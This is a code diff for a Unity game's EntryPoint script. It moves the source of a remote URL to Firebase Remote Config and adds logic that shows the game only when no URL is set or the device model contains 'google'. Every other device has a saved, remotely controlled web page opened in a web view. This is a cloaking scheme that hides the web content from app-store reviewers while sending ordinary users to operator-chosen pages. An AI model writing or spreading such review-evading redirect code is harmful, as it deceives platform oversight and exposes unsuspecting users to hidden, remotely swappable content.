@@ -1,37 +1,35 @@
 using UnityEngine;
-
-[System.Serializable]
-public class ExpectedJsonTemplate {
-    public string URL;
-}
+using System.Collections;
 
 public class EntryPoint : MonoBehaviour
 {
-    private const string localJsonConfigPath = "/remoteConfig.json";
     [SerializeField] private View _viewObject;
     [SerializeField] private GameObject _noInternetScreen;
 
-    void Start()
-    {
-        string reference = PlayerPrefs.GetString("ref", "");
+    private void Awake() {
+        FB_GServices.IncludeDependencies();
+    }
 
-        if (reference == "") {
-            GetRemoteConfig();
+    void Start()
+    { 
+        string reference = PlayerPrefs.GetString("url", "");
+
+        if (reference != "") {
+            Debug.Log("REFERENCE IS SAVED IN PLAYER PREFS : " + reference);
+            OpenWebView(reference);  
         } else {
-            OpenWebView(reference);   
+            Debug.Log("NO SAVED REFRENCE.. KNOCKING FIREBASE");
+            StartCoroutine(WaitForFetch(() => {
+                GetRemoteConfig();
+            }));
         }
     }
 
     private void GetRemoteConfig() {
-        string jsonFilePath = Application.streamingAssetsPath + localJsonConfigPath;
-        
         try {
-            ExpectedJsonTemplate obj = JsonUtility.FromJson<ExpectedJsonTemplate>(System.IO.File.ReadAllText(jsonFilePath));
-            
-            string reference = "";
-            StartCoroutine(InternetConnection.SendRequestTo(obj.URL, (string responseText) => {
-                reference = responseText;
-            }));
+            string reference = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
+
+            Debug.Log(reference);
 
             if (reference == "" ||
                 SystemInfo.deviceModel.ToLower().Contains("google") ||
@@ -39,7 +37,7 @@ public class EntryPoint : MonoBehaviour
             ) {
                 // Playgame
             } else {
-                PlayerPrefs.SetString("ref", reference);
+                PlayerPrefs.SetString("url", reference);
                 OpenWebView(reference);
             }
         }
@@ -62,6 +60,12 @@ public class EntryPoint : MonoBehaviour
                 _viewObject.Show(address);
             }
         }));
+    }
+
+    private IEnumerator WaitForFetch(System.Action callback) {
+        yield return new WaitUntil(() => FB_GServices.isRemoteConfigFetched == true);
+
+        callback();
     }
 
 
